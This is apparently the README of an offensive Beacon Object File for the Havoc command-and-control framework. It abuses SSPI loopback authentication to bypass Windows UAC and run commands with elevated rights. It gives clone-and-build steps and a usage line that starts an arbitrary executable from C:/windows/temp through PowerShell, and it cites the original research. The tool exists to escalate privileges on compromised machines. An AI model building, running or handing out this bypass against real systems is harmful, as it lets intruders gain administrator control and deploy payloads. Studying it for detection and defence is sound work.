# Havoc Bypass Uac via Sspi Bof

![](README_20240715133832078.png)

<p align="center">
<img src="https://raw.githubusercontent.com/Sh4N4C1/gitbook/main/images/uac_sspi_bof.png" alt="sh4loader">
</p>

Perform loopback network authentication let LSASS using the first token created in the logon session rather than the caller’s token. Use the custom RPC client execute command.



## Install

```
git clone https://github.com/Sh4N4C1/Havoc_uac_sspi_bof
make
```


## Usage

```bash
uac_sspi "powershell Start-Process -FilePath C:/windows/temp/launch.exe"
```


## Resource

https://splintercod3.blogspot.com/p/bypassing-uac-with-sspi-datagram.html
